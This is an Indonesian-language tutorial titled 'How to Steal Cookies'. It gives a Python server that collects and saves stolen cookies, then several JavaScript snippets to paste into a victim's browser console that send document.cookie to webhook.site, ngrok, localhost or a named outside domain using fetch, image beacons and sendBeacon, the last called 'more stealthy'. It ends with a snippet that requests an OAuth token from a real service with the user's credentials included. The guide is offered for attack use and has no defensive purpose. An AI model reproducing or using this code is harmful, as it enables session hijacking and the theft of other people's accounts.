# Cara Curi Cookie

**1. Siapkan server http degna python**

```python
# server.py - menampilkan semua cookie dengan rapi
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, unquote

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.query:
            # Decode URL encoding
            decoded = unquote(parsed.query)
            
            # Hapus prefix "c=" jika ada (kita kirim '?c=' + cookie)
            if decoded.startswith('c='):
                cookie_string = decoded[2:]
            else:
                cookie_string = decoded
            
            # Pisahkan cookie berdasarkan "; " (standar format cookie)
            cookies = cookie_string.split('; ')
            
            print("\n" + "="*60)
            print("[✓] COOKIE DICURI (LENGKAP)!")
            print("="*60)
            
            # Tampilkan setiap cookie per baris
            for cookie in cookies:
                if '=' in cookie:
                    key, value = cookie.split('=', 1)
                    print(f"{key}: {value}")
                else:
                    print(cookie)
            
            print("="*60)
            
            # Simpan ke file (raw string tanpa 'c=')
            with open("cookie.txt", "w") as f:
                f.write(cookie_string)
        
        # Response gambar 1x1 pixel GIF valid
        self.send_response(200)
        self.send_header('Content-Type', 'image/gif')
        self.end_headers()
        self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
    
    def log_message(self, format, *args):
        pass  # matikan log default

if __name__ == '__main__':
    print("[*] Server berjalan di http://localhost:8000")
    print("[*] Menunggu cookie dikirim...")
    HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()

```



**2. Jalankan server nya**

```bash
python3 server.py
```



**3. Masukkan di console Korban**

  * Tes dulu denga localhost
  Bis testing dulu enga localhost,paek ngrok untuk test online,,jika gagal pake webhook.site,,jika masih gagal gunakn yang lain,saya pake doain sendiri dan itu bisa



```js
fetch('https://localhost/?c=' + encodeURIComponent(document.cookie), {
  mode: 'no-cors',
  headers: {
    'ngrok-skip-browser-warning': 'true'
  }
});
```


```js
fetch('https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx?cookie=' + encodeURIComponent(document.cookie))
```


```js
fetch('https://webhook.site/abc123-def456?data=' + encodeURIComponent(document.cookie))
  .then(() => console.log('Cookie terkirim'))
  .catch(e => console.log('Error:', e));
```

atau jika fetch diblokir (tapi kecil kemungkinan karena CSP longgar), pakai ini:

🎯 Solusi: Gunakan Image Beacon
Ini tidak akan kena CORS karena image request tidak dibatasi. Silakan coba.


```js
var img = new Image();
img.src = 'https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx?cookie=' + encodeURIComponent(document.cookie);
```

Atau pakai navigator.sendBeacon (lebih stealthy):

```js
navigator.sendBeacon('https://testing.aigoretech.cloud', document.cookie);
```


```js
var img = new Image();
img.src = 'https://testing.aigoretech.cloud?c=' + encodeURIComponent(document.cookie);
```

```js
var img = new Image();
img.src = 'http://localhost:8000/?c=' + encodeURIComponent(document.cookie); 
```




## Curi Cookie dari Response Body Json

```js
fetch('/some-endpoint').then(res => {
  console.log(res.headers.get('Set-Cookie'));
});
```

```js
fetch("https://auth.grammarly.com/v4/api/oauth/token", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    client_id: "firefoxExt",
    grant_type: "urn:ietf:params:oauth:grant_type:client_id"
  })
}).then(r => r.json()).then(console.log)
```